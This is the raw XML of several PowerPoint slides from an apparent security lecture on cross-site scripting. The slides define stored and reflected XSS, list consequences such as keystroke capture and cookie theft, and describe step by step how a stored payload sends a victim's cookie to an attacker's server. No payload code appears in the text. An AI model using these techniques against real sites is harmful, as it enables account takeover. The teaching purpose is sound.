          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The web server provides the following HTML code to users that visit this web page </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>When the page loads in the victim’s browser, the attacker’s malicious script executes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Most often, the victim does not realize it and is unable to prevent such an attack. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>10</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298685" y="3248168"/>
            <a:ext cx="8849137" cy="1205894"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1037579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FDCF3B-73AB-62C1-54DD-01C0408167DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1154954" y="973667"/>
            <a:ext cx="9759789" cy="1522789"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Roboto" panose="02000000000000000000" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Potential consequences of cross-site scripting attacks include:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Roboto" panose="02000000000000000000" pitchFamily="2" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{366B40A6-13F3-62F4-61C4-6E213C2B8562}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="111C24"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Roboto" panose="02000000000000000000" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Capturing the keystrokes of a user</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="111C24"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Roboto" panose="02000000000000000000" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Redirecting a user to a malicious website</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="111C24"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Roboto" panose="02000000000000000000" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Running web browser–based exploits (e.g., crashing the browser)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="111C24"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Roboto" panose="02000000000000000000" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Obtaining the cookie information of a user who is logged into a website, thus compromising the victim’s account</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7AC14CDF-70A8-E443-B700-7F2D1A9D57CF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>11</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42365029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Stealing Cookies Using XSS </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Content Placeholder 4"/>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1154954" y="2326852"/>
            <a:ext cx="9197586" cy="4196778"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22784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Stealing Cookies Using XSS </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The attacker injects a payload into the website’s database by submitting a vulnerable form with malicious JavaScript content.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The victim requests the web page from the web server.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The web server serves the victim’s browser the page with attacker’s payload as part of the HTML body</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The victim’s browser executes the malicious script contained in the HTML body. In this case, it sends the victim’s cookie to the attacker’s server.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The attacker now simply needs to extract the victim’s cookie when the HTTP request arrives at the server.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> The attacker can now use the victim’s stolen cookie for impersonation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>13</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33338137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 of XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Stored or Persistent XSS attack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Google Sans"/>
              </a:rPr>
              <a:t>Stored XSS, also known as persistent XSS, is the more damaging of the two. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Google Sans"/>
              </a:rPr>
              <a:t>It occurs when a malicious script is injected directly into a vulnerable web application.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Google Sans"/>
              </a:rPr>
              <a:t>Reflected XSS involves the reflecting of a malicious script off of a web application, onto a user's browser.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Reflective XSS attack </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="285AE6"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Inter"/>
              </a:rPr>
              <a:t>I</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Inter"/>
              </a:rPr>
              <a:t>nvolves the reflecting of a malicious script off of a web application, onto a user’s browser. The script is embedded into a link, and is only activated once that link is clicked on.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>14</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10246301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295931" y="71438"/>
            <a:ext cx="5593136" cy="678968"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr spc="-21" dirty="0"/>
              <a:t>Stored </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="-311" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr spc="-11" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="49" dirty="0"/>
              <a:t>attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="158723" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7509343" y="4395508"/>
            <a:ext cx="1553415" cy="1410541"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="158724" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="4430527"/>
            <a:ext cx="1484779" cy="1340503"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534556" y="4430526"/>
            <a:ext cx="1484779" cy="831028"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D026"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="2634" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="21"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="3177" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="78572" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2206" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr sz="2206" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="158726" name="object 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7509343" y="1350309"/>
            <a:ext cx="1536606" cy="1393732"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
